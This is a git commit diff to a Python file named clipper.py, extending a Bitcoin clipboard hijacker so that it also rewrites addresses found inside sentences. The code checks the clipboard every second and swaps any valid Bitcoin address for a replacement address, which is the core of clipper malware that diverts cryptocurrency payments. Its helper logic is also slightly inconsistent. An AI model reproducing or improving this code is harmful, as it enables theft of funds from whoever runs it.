fe04267a1e4942926b97ff23573e4ff63157f9d2
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-26 18:32:21 +0100

    make clipper work with sentences

--- clipper.py
+++ clipper.py
@@ -1,18 +1,29 @@
+import re
 import asyncio
 
 from helpers.bitcoin import bitcoin
 from helpers.clipboard import clipboard
+from helpers.clipboard import set_contents
     
+def containsMultipleWords(string: str) -> bool:
+    sentence = string.strip()
+    
+    return bool(re.search(r'\b\w+\b', sentence))
+
 async def bitcoinClipper(switch_address: str):
     while True:
         await asyncio.sleep(1)
+        
         clipboard_contents: str = clipboard.contents()
         
-        if bitcoin.is_valid_address(clipboard_contents) is True:
-            
-            clipboard.set_contents(switch_address)
+        if containsMultipleWords(clipboard_contents):
+            clipboard.set_sentence(clipboard_contents, switch_address)
+        else:
+            if bitcoin.is_valid_address(clipboard_contents):
+                set_contents(switch_address)
+
 
 if __name__ == "__main__":
-    switch_address: str = "You just got bitcoin clippered."
-
-    asyncio.run(bitcoinClipper(switch_address=switch_address))#
+    switch_address: str = "you got clipped!"
+    
+    asyncio.run(bitcoinClipper(switch_address=switch_address))
